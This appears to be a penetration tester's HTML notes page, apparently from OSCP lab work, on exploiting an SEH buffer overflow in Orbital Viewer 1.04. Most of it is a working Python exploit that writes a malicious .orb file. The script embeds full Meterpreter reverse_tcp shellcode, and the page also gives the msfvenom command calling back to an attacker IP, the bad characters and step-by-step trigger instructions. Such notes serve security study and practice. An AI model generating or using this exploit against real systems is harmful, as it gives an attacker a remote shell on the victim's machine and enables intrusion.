<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Orbital Viewer</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Orbital Viewer</h1></strong><br />Orbitals are a 3d description of the most likely location of an electron around an atom.<br />Orbital Viewer lets you view these.<br /><br /><strong><h2>## Tips</h2></strong><br />• Try opening Orbital Viewer, <code>File &gt; Open</code>, and see if you can browse Administrator and/or restricted files<br />   ◇ if you can, nice, and it means you know the programming is running Admin and you can exploit it<br /><br /><strong><h2>## Exploits<br />## Orbital Viewer 1.04 - &#39;.orb&#39; File Local Universal Overflow (SEH)</h2></strong><br /><a href="https://www.exploit-db.com/exploits/11581">https://www.exploit-db.com/exploits/11581</a><br /><br />The <code>.orb</code> file can store a buffer overflow<br /><br /><strong>Examples</strong><br />• oscp 10.11.1.248 - Brett<br /><br /><strong><h3>### How-to</h3></strong><br /><strong>1. Generate .orb</strong><br />The exploit code in the exploit-db entry works fine, but I&#39;ve modified it slightly to generate a <code>.orb</code> file.<br />Tested for Windows XP SP3<br /><br /><div class="codebox"><div class="codebox">header&nbsp;=&nbsp;&quot;\x4f\x72\x62\x69\x74\x61\x6c\x46&quot;<br />header&nbsp;+=&nbsp;&quot;\x69\x6c\x65\x56\x31\x2e\x30\x0d\x0a&quot;<br />nops&nbsp;=&nbsp;&quot;\x90&quot;&nbsp;*&nbsp;1010<br />fly&nbsp;=&nbsp;&quot;\xe9\xc8\xf9\xff\xff&quot;<br />nseh&nbsp;=&nbsp;&quot;\xeb\xf9\x90\x90&quot;	<br />seh&nbsp;=&nbsp;&quot;\x50\x82\x45&quot;		#&nbsp;partial&nbsp;overwrite&nbsp;-&nbsp;ppr&nbsp;from&nbsp;ov.exe<br /><br />#&nbsp;msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=10.11.0.184&nbsp;LPORT=443&nbsp;-b&nbsp;&quot;\x00\x0a\xbd\x0d\x20&quot;&nbsp;EXITFUNC=seh&nbsp;-e&nbsp;x86/alpha_mixed&nbsp;-f&nbsp;python&nbsp;-v&nbsp;shellcode<br />#&nbsp;Payload&nbsp;size:&nbsp;368&nbsp;bytes<br />shellcode&nbsp;=&nbsp;&nbsp;b&quot;&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x2b\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x5e\x81\x76\x0e\xbe\x1b\x2c\x27\x83\xee\xfc&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xe2\xf4\x42\xf3\xae\x27\xbe\x1b\x4c\xae\x5b&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x2a\xec\x43\x35\x4b\x1c\xac\xec\x17\xa7\x75&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xaa\x90\x5e\x0f\xb1\xac\x66\x01\x8f\xe4\x80&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x1b\xdf\x67\x2e\x0b\x9e\xda\xe3\x2a\xbf\xdc&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xce\xd5\xec\x4c\xa7\x75\xae\x90\x66\x1b\x35&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x57\x3d\x5f\x5d\x53\x2d\xf6\xef\x90\x75\x07&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xbf\xc8\xa7\x6e\xa6\xf8\x16\x6e\x35\x2f\xa7&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x26\x68\x2a\xd3\x8b\x7f\xd4\x21\x26\x79\x23&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xcc\x52\x48\x18\x51\xdf\x85\x66\x08\x52\x5a&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x43\xa7\x7f\x9a\x1a\xff\x41\x35\x17\x67\xac&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xe6\x07\x2d\xf4\x35\x1f\xa7\x26\x6e\x92\x68&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x03\x9a\x40\x77\x46\xe7\x41\x7d\xd8\x5e\x44&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x73\x7d\x35\x09\xc7\xaa\xe3\x73\x1f\x15\xbe&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x1b\x44\x50\xcd\x29\x73\x73\xd6\x57\x5b\x01&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xb9\x92\xc4\xd8\x6e\xa3\xbc\x26\xbe\x1b\x05&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xe3\xea\x4b\x44\x0e\x3e\x70\x2c\xd8\x6b\x71&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x26\x4f\xb4\x10\x2c\x9f\xd6\x19\x2c\x26\x05&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x92\xca\x77\xee\x4b\x7c\x67\xee\x5b\x7c\x4f&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x54\x14\xf3\xc7\x41\xce\xbb\x4d\xae\x4d\x7b&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x4f\x27\xbe\x58\x46\x41\xce\xa9\xe7\xca\x11&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xd3\x69\xb6\x6e\xc0\xcf\xd9\x1b\x2c\x27\xd4&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x1b\x46\x23\xe8\x4c\x44\x25\x67\xd3\x73\xd8&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x6b\x98\xd4\x27\xc0\x2d\xa7\x11\xd4\x5b\x44&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x27\xae\x1b\x2c\x71\xd4\x1b\x44\x7f\x1a\x48&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xc9\xd8\x6b\x88\x7f\x4d\xbe\x4d\x7f\x70\xd6&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x19\xf5\xef\xe1\xe4\xf9\xa4\x46\x1b\x51\x0f&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xe6\x73\x2c\x67\xbe\x1b\x46\x27\xee\x73\x27&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\x08\xb1\x2b\xd3\xf2\xe9\x73\x59\x49\xf3\x7a&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xd3\xf2\xe0\x45\xd3\x2b\x9a\x14\xa9\x57\x41&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xe4\xd3\xce\x25\xe4\xd3\xd8\xbf\xd8\x05\xe1&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xcb\xda\xef\x9c\x40\x15\x1e\xcd\xd4\x1b\x7f&quot;<br />shellcode&nbsp;+=&nbsp;b&quot;\xd8\x6b\x71\x2c\xe4&quot;<br /><br />junk&nbsp;=&nbsp;&quot;\x41&quot;&nbsp;*&nbsp;(5045&nbsp;-&nbsp;len(shellcode))<br />lol&nbsp;=&nbsp;header&nbsp;+&nbsp;junk&nbsp;+&nbsp;nops&nbsp;+&nbsp;shellcode&nbsp;+&nbsp;fly&nbsp;+&nbsp;nseh&nbsp;+&nbsp;seh<br /><br />vulnerable&nbsp;=&nbsp;open(&quot;orbwalker.orb&quot;,&#39;w&#39;)<br />vulnerable.write(lol)<br />vulnerable.close()<br />print&nbsp;&quot;[+]&nbsp;.orb&nbsp;exploit&nbsp;file&nbsp;created!&quot;</div></div><br /><br /><strong>2. Generate shellcode</strong><br />Bad chars for this exploit:<br /><code>&quot;\x00\x0a\xbd\x0d\x20&quot;</code><br /><br /><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.184 LPORT=443 -b &quot;\x00\x0a\xbd\x0d\x20&quot; EXITFUNC=seh -e x86/alpha_mixed -f python -v shellcode</code><br /><br />You can use whatever payload you want.<br />HOWEVER, this exploit is picky about the <code>x86/alpha_mixed</code> encoder. <br />Make sure you use that encoder!<br /><br /><strong>3. Open .orb file</strong><br />Open the <code>.orb</code> file in Orbital Viewer to trigger the buffer overflow.<br /></div>
</body>
</html>
